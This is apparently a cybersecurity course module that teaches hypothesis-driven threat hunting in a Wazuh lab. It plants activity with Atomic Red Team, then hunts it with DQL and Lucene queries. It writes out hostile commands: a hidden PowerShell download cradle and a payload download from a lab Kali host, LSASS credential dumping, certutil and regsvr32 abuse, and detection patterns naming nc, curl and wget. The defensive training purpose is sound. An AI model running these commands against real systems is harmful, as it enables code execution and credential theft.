# 07 — Proactive Threat Hunting Techniques

**Course topic: 9.4 Proactive Threat Hunting Techniques**
**Where:** Wazuh dashboard (`siem`) for hunting; Kali/victim to plant the activity you'll hunt.

**Goal:** move from *waiting for alerts* to *actively looking*. Teach a repeatable, hypothesis-driven hunt loop and run real hunts against telemetry you generate.

---

## 1. What threat hunting is (teach this)

Threat hunting is **proactively searching** telemetry for malicious activity that automated alerts missed. Assumptions:

- **Assume breach** — act as if an adversary is already inside.
- **Hypothesis-driven** — start from a specific, testable idea, not "let's look around."
- **Behavior over signatures** — hunt TTPs (ATT&CK), because IoCs get evaded.

### The hunt loop

```
1. Hypothesis   → "An attacker may be using PowerShell to download payloads."
2. Data         → Which telemetry proves/disproves it? (Sysmon EID 1/3, PS Operational)
3. Hunt/Query   → Filter that data in Wazuh Discover.
4. Analyze      → Triage hits: benign, suspicious, malicious?
5. Outcome      → Either a finding (→ IR) OR a gap (→ new detection rule, Doc 08).
6. Document     → Record hypothesis, queries, result. Repeat.
```

The key output of hunting: **either a finding or a new detection**. A hunt that finds nothing still wins if it becomes a rule.

---

## 2. Where you hunt in Wazuh

- **Threat Hunting / Discover** — search bar + filters. Time picker: **Last 15 minutes** while you generate activity.
- **Fields to know:** `agent.name`, `rule.mitre.id`, `rule.level`, `data.win.eventdata.image`, `data.win.eventdata.commandLine`, `data.win.eventdata.parentImage`, `data.win.eventdata.destinationIp`, `data.win.eventdata.destinationPort`, `data.win.system.eventID`.
- Discover mostly shows **alerts**, not every raw Sysmon line. If Event Viewer has the event and Discover does not, the manager never created an alert (or the time range is wrong).
- Pin the Windows agent: `agent.name: win-victim` (use the **exact** name from Endpoint Summary).

### DQL vs Lucene (read this or queries will fail)

The Discover bar defaults to **DQL**. Queries that use `*wildcards*`, `(a or b)`, and `*-enc*` are **Lucene**. DQL will show: *“It looks like you may be trying to use Lucene query syntax…”*

- **Stay on DQL:** short queries, no `*`, one condition at a time (examples labeled **DQL** below).
- **Or** switch the language dropdown to **Lucene** and use the longer queries (**Lucene**). In Lucene use `AND` / `OR` in capitals.

---

## 3. Load Atomic Red Team (Windows, Admin PowerShell)

If `Invoke-AtomicTest` is not found:

```powershell
Set-ExecutionPolicy Bypass -Scope LocalMachine -Force
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics -Force
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
Add-MpPreference -ExclusionPath "C:\AtomicRedTeam"
```

Import the **`.psd1`**, not `install-atomicredteam.ps1`. Snapshot `pre-attack` before a hunt session.

Always: `Invoke-AtomicTest <T#> -ShowDetailsBrief` then `-CheckPrereqs`, then run only tests that are **Met**. Cleanup with `-Cleanup`.

---

## 4. Hunt playbook

### Hunt A — Suspicious PowerShell
**Hypothesis:** encoded/hidden PowerShell or a download cradle.  
**Generate:**

```powershell
Invoke-AtomicTest T1059.001 -CheckPrereqs
Invoke-AtomicTest T1059.001 -TestNumbers 1
# or a cradle toward Kali (404 is fine — you hunt the attempt):
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.100:8080/x.ps1')"
```

**DQL:**

```
data.win.eventdata.image: powershell.exe and data.win.eventdata.commandLine: DownloadString
```

```
data.win.eventdata.image: powershell.exe and data.win.eventdata.commandLine: hidden
```

**Lucene:**

```
data.win.eventdata.image: *powershell.exe* AND (data.win.eventdata.commandLine: *DownloadString* OR data.win.eventdata.commandLine: *enc* OR data.win.eventdata.commandLine: *hidden*)
```

Triage: admin scripts vs hidden/encoded/remote-download.

---

### Hunt B — LOLBins
**Hypothesis:** signed Windows binaries abused to run or download code.  
**Generate:**

```powershell
Invoke-AtomicTest T1218.010 -TestNumbers 1     # regsvr32
Invoke-AtomicTest T1218.011 -TestNumbers 1     # rundll32
Invoke-AtomicTest T1105 -TestNumbers 7         # certutil urlcache
```

**DQL:** `data.win.eventdata.image: certutil.exe`  
**Lucene:**

```
data.win.eventdata.image: (*regsvr32.exe* OR *rundll32.exe* OR *certutil.exe*) AND (data.win.eventdata.commandLine: (*http* OR *scrobj* OR *urlcache*))
```

Triage: `certutil -urlcache` and `regsvr32 /i:http...` are classic abuse.

---

### Hunt C — Parent/child (Office or browser → shell)
**Hypothesis:** a document or browser spawned a shell.

This lab VM often has **Edge** and **no Office / no Chrome**. `T1566.001` (Word macro) will fail prereqs without Word. Hunt **`msedge.exe`**, not only `chrome.exe` / `winword.exe`.

**Generate (no Office):**

```powershell
Invoke-AtomicTest T1566.002 -ShowDetailsBrief
Invoke-AtomicTest T1566.002 -CheckPrereqs
# run a test only if Met — many only open a URL and will NOT spawn powershell
```

**DQL (this lab):**

```
data.win.eventdata.parentImage: msedge.exe and data.win.eventdata.image: powershell.exe
```

**Lucene (full pattern, including Office if you install it later):**

```
data.win.eventdata.parentImage: (*winword.exe* OR *excel.exe* OR *msedge.exe* OR *chrome.exe*) AND data.win.eventdata.image: (*cmd.exe* OR *powershell.exe* OR *wscript.exe*)
```

Triage: Word/Edge spawning PowerShell is almost never benign. If Discover is empty, say so on camera — the **query** is the lesson; macro telemetry needs Word.

---

### Hunt D — LSASS access (Sysmon EID 10)
**Hypothesis:** something is reading LSASS memory (T1003.001).  
**Generate:**

```powershell
Invoke-AtomicTest T1003.001 -ShowDetailsBrief
Invoke-AtomicTest T1003.001 -CheckPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 1
Invoke-AtomicTest T1003.001 -Cleanup
```

Needs **Administrator**. Defender may block some tests.

**DQL:**

```
data.win.system.eventID: "10" and data.win.eventdata.targetImage: lsass.exe
```

**Lucene:**

```
data.win.system.eventID: "10" AND data.win.eventdata.targetImage: *lsass.exe*
```

Confirm on Windows: Sysmon Operational, Event ID **10**, message contains `lsass`.  
Triage: non-system processes with `GrantedAccess` like `0x1010` / `0x1fffff` = likely dumping. This becomes rule **100301** in Doc 08.

---

### Hunt E — Unusual outbound (Sysmon EID 3)
**Hypothesis:** C2 or a reverse shell on a non-browser process.

**Why default Atomic often shows no Event ID 3:** T1105 defaults to **HTTPS (443)** on the internet. With **NAT off**, nothing connects. With SwiftOnSecurity, **most 443** connections are **filtered** — you get Sysmon **EID 1** (process) but **not EID 3**. Hunt `certutil.exe` / `curl.exe` (EID 1) or force a lab connection on **8080/4444**.

**Generate — Atomic download (EID 1 + maybe 443):**

```powershell
Invoke-AtomicTest T1105 -CheckPrereqs -TestNumbers 7,10,15,18,29
Invoke-AtomicTest T1105 -TestNumbers 7,10,15,18,29
```

Then hunt **EID 1**: `data.win.eventdata.image: certutil.exe` / `curl.exe`.

**Generate — guaranteed EID 3 to Kali:4444 (this is Hunt E):**

On Kali (`/tmp` if you already have `invoice.exe`):

```bash
cd /tmp
python3 -m http.server 4444
```

On Windows:

```powershell
# Atomic T1105-29 pointed at Kali (not GitHub)
Invoke-AtomicTest T1105 -TestNumbers 29 -InputArgs @{
  "remote_file" = "http://10.10.10.100:4444/invoice.exe"
  "local_path"  = "$env:TEMP\invoice.exe"
}
# or a raw TCP connect (no Atomic):
# $c = New-Object System.Net.Sockets.TcpClient; $c.Connect("10.10.10.100", 4444); $c.Close()
```

`T1105-29` **only downloads**. It does not start Meterpreter. To get a session later (Doc 10): start the Metasploit handler on Kali, then run `$env:TEMP\invoice.exe` (Defender may delete it). `ping` is ICMP — it does **not** create Sysmon EID 3.

**DQL:**

```
data.win.system.eventID: "3" and data.win.eventdata.destinationPort: "4444"
```

**Lucene:**

```
data.win.system.eventID: "3" AND data.win.eventdata.destinationIp: "10.10.10.100" AND data.win.eventdata.destinationPort: "4444"
```

```
data.win.system.eventID: "3" AND data.win.eventdata.destinationPort: (4444 OR 8080) AND NOT data.win.eventdata.image: *msedge.exe*
```

Triage: `powershell.exe` / `invoice.exe` to `10.10.10.100:4444` is lab C2. Edge to 443 is noise — that is why browsers are excluded. Becomes rule **100340** in Doc 08.

---

### Hunt F (Linux, if built) — Command execution
**DQL:** `agent.name: linux-victim and data.audit.key: exec`  
**Lucene:**

```
agent.name: "linux-victim" AND data.audit.key: "exec" AND data.audit.execve.a0: (*nc* OR *bash* OR *curl* OR *wget*)
```

---

## 5. Baselining (so you know what "normal" is)

Hunting requires a baseline. Have students:
- Snapshot **normal** activity for 10–15 minutes (no attacks) and note the common processes, parents, and destinations.
- Then run attacks and re-hunt — the deltas stand out. This "known-good vs. now" contrast is the core hunting skill.

---

## 6. From hunt to detection

Every good hunt query is a **candidate detection rule**. When Hunt D reliably finds LSASS access, you promote that query into a Wazuh rule so it alerts automatically next time. That handoff is exactly Doc 08.

Update your coverage map: mark which techniques you can currently only *hunt* (manual) vs. *detect* (automated). The module's job is to convert hunts → detections.

---

## Verify

- [ ] You can articulate the 6-step hunt loop.
- [ ] Hunts A, B, D, E return planted activity (C may be empty without Office — that is OK).
- [ ] You can switch Discover between DQL and Lucene without the syntax warning.
- [ ] You saved at least two hunts as saved searches.
- [ ] You identified at least one gap to turn into a rule (e.g. LSASS access).

---

> [!NOTE]
> **Recording checkpoint (9.4):** Record **Lesson 9.4 — Proactive Threat Hunting Techniques** now. Flow: assume-breach mindset + hunt loop → generate activity live → run Hunts A–E in Discover → triage true vs false positives → end on "this hunt becomes a rule," which sets up 9.5. Strong, hands-on lecture.

Next: [08 — Building Detection Rules](08-building-detection-rules.md)
